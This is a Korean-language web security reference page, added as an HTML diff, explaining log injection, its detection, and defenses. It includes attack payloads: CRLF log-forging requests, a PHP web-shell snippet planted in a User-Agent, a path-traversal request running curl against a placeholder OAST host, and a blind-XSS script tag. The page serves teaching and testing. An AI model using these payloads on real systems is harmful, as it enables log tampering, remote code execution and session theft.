@@ -1,0 +1,98 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Log Injection — PIXN</title>
+  <meta name="description" content="Log Injection — Vulnerabilities, attack surfaces, and defensive verification notes.">
+  <meta property="og:title" content="Log Injection — PIXN"><meta property="og:description" content="Log Injection — Vulnerabilities, attack surfaces, and defensive verification notes."><meta property="og:image" content="https://whgusals84.github.io/pixn-security/og.png"><meta name="twitter:card" content="summary_large_image">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+  <header data-site-header data-active="reference"></header>
+  <main class="page article-page" id="main">
+    <header class="article-heading">
+      <p class="eyebrow"><a href="/reference/">Reference</a> / <a href="/reference/attack/">Web Security</a></p>
+      <h1>Log Injection</h1>
+      <time datetime="2022-04-07">APRIL 7, 2022</time>
+    </header>
+    <article class="article-body"><h2 id="introduction">Introduction</h2>
+<p>Log Injection은 사용자 입력이 로그에 포함되는 경우 공격자가 이를 이용해 로그 항목을 위조하거나 악성 내용을 로그에 삽입할 수 있습니다.</p>
+<h2 id="offensive-techniques">Offensive techniques</h2>
+<h3 id="detect">Detect</h3>
+<h4 id="whitebox">WhiteBox</h4>
+<p>소스코드 또는 로그를 확인할 수 있는 경우 식별하기 쉽습니다. 에러 로그에서 사용자의 입력 값을 포함하여 로깅하는 경우 해당 취약점의 영향을 받습니다.</p>
+<ul>
+<li>코드레벨: 각 언어에서 로그를 작성하는 부분 중 사용자 입력이 존재하는지 체크</li>
+<li>로그레벨: 실제로 웹 요청을 통해 에러를 유도하고, 기록되는 로그를 체크</li>
+</ul>
+<p>언어 별 취약한 코드는 <a href="https://vulncat.fortify.com/ko/detail?id=desc.dataflow.abap.log_forging#Ruby">Vulncat에 정리되어 있으니 해당 문서</a>를 참고해주세요.</p>
+<pre><code class="language-go hljs"><span class="hljs-comment">// 취약 코드 예시
+</span><span class="hljs-comment"></span><span class="hljs-comment">// 아래 코드는 query 파라미터로 부터 얻은 값이 별도의 검증 없이
+</span><span class="hljs-comment"></span><span class="hljs-comment">// log로 기록됩니다.
+</span><span class="hljs-comment"></span>
+input <span class="hljs-operator">:=</span> r<span class="hljs-punctuation">.</span><span class="hljs-title function_">FormValue</span><span class="hljs-punctuation">(</span><span class="hljs-string">&quot;query&quot;</span><span class="hljs-punctuation">)</span>
+logger<span class="hljs-punctuation">.</span><span class="hljs-title function_">ErrorF</span><span class="hljs-punctuation">(</span><span class="hljs-string">&quot;Error input: %s / %s&quot;</span><span class="hljs-punctuation">,</span> input<span class="hljs-punctuation">,</span> err<span class="hljs-punctuation">)</span>
+</code></pre>
+<h4 id="blackbox">BlackBox</h4>
+<p>소스코드나 로그를 통해 확인할 수 없다면 일반적으로 식별하기 어렵습니다. 단 Blind 계통의 취약점을 통해 확인할 수 있는 경우가 있습니다. 이 때 <a href="https://www.hahwul.com/cullinan/oast/">OAST</a>를 이용한 테스팅 방법이 가장 유용합니다. 로그 내 OAST 요청을 발생시키는 코드를 삽입한 후 로그를 유도하여 OAST 서비스를 통해 Reaction을 확인하고, 요청이 온다면 백엔드에서 Blind 계통의 취약점 가능성이 있다는 것을 알 수 있게 됩니다.</p>
+<p>e.g</p>
+<pre><code>GET /please_error_trigger HTTP/1.1
+User-Agent: aaaaaaa&quot;&gt;&lt;img/src=OAST&gt;
+</code></pre>
+<p>단 Callback이 온 경우 단순 Log injection이 아닌 Blind SSRF, Blind XSS 등 다른 취약점일 가능성이 높습니다.</p>
+<h3 id="exploitation">Exploitation</h3>
+<h4 id="log-forging">Log forging</h4>
+<p>사용자 입력이 로그에 반영되는 부분이 있다면 CRLF(\r\n) 문자를 이용하여 새로운 로그를 작성할 수 있습니다. 이러한 로그는 침해사고 분석을 어렵게할 수 있고, 로그의 무결성을 해쳐서 로그의 신뢰도를 떨어뜨리고, 로그가 가지는 부인 방지로서의 목적을 상실하게 할 수 있습니다.</p>
+<p>코드</p>
+<pre><code class="language-go hljs">input <span class="hljs-operator">:=</span> r<span class="hljs-punctuation">.</span><span class="hljs-title function_">FormValue</span><span class="hljs-punctuation">(</span><span class="hljs-string">&quot;query&quot;</span><span class="hljs-punctuation">)</span>
+logger<span class="hljs-punctuation">.</span><span class="hljs-title function_">ErrorF</span><span class="hljs-punctuation">(</span><span class="hljs-string">&quot;[&#39;%s&#39; User][error][input: %s] %s&quot;</span><span class="hljs-punctuation">,</span> username<span class="hljs-punctuation">,</span> input<span class="hljs-punctuation">,</span> err<span class="hljs-punctuation">)</span>
+</code></pre>
+<p>요청과 정상 로그</p>
+<pre><code>GET /?query=aaaa
+
+['A' User][error][input: aaaa] invalid data
+</code></pre>
+<p>공격 요청과 로그</p>
+<pre><code>GET /?query=aaaa]%20invalid%20data%0d%0a['B' User][token]%20re-generate%20token
+
+['A' User][error][input: aaaa] invalid data
+['B' User][token] re-generate token
+</code></pre>
+<h4 id="log-poisoning">Log Poisoning</h4>
+<p>Log 데이터를 통제할 수 있고 서비스 내 LFI, Path Traversal 취약점이 있는 경우 로그 파일의 경로를 유추하여 RCE 등 위험도 높일 수 있습니다.</p>
+<p>First request (log poisoning)</p>
+<pre><code>GET / HTTP/1.1
+User-Agent: aa&lt;?php echo system($_GET['cmd']); ?&gt;bb
+</code></pre>
+<p>Second request (path traversal)</p>
+<pre><code>GET /file.php?path=/var/log/apache2/access.log?cmd=curl%20&lt;OAST&gt;/rce HTTP/1.1
+</code></pre>
+<p><img loading="lazy" src="https://user-images.githubusercontent.com/13212227/162201327-7538731d-5ccf-4768-9563-5466498a5d50.png" alt="" /></p>
+<h4 id="blind-xss">Blind XSS</h4>
+<p>로그를 처리하는 어드민이나 웹 서비스가 있다면 이를 이용해서 Blind XSS가 가능할 수 있습니다.</p>
+<pre><code>GET /?query=aaa&quot;'&gt;&lt;/script&gt;&lt;script src=&lt;OAST&gt;&gt;&lt;/script&gt;
+
+// 로그
+['A' User][error][input: aaa&quot;'&gt;&lt;/script&gt;&lt;script src=&lt;OAST&gt;&gt;&lt;/script&gt;] invalid data
+
+// 만약 웹 서비스에서 위 로그를 확인할 수 있다면 Blind XSS가 가능합니다.
+</code></pre>
+<h2 id="defensive-techniques">Defensive techniques</h2>
+<p>가급적 사용자의 입력이 로그에 반영되지 않도록 코드를 작성해야하며, 만약 사용자 입력이 반영되어야 하는 경우 로그 포맷에 영향을 줄 수 없도록 CRLF, Tab, 과도한 Space 등의 문자는 기록되지 않도록 검증해야 합니다.</p>
+<h2 id="tools">Tools</h2>
+<ul>
+<li>소스코드 분석 도구</li>
+<li><a href="https://www.hahwul.com/cullinan/oast/#-tools">OAST 관련 도구</a></li>
+</ul>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://owasp.org/www-community/attacks/Log_Injection">https://owasp.org/www-community/attacks/Log_Injection</a></li>
+<li><a href="https://www.hahwul.com/cullinan/oast/">https://www.hahwul.com/cullinan/oast/</a></li>
+</ul></article>
+    <footer class="article-source"><span>Republished with permission</span><a href="https://www.hahwul.com/cullinan/attack/log-injection/" rel="noopener noreferrer">Original source ↗</a></footer>
+  </main>
+  <footer data-site-footer></footer><script src="/assets/site.js"></script>
+</body>
+</html>
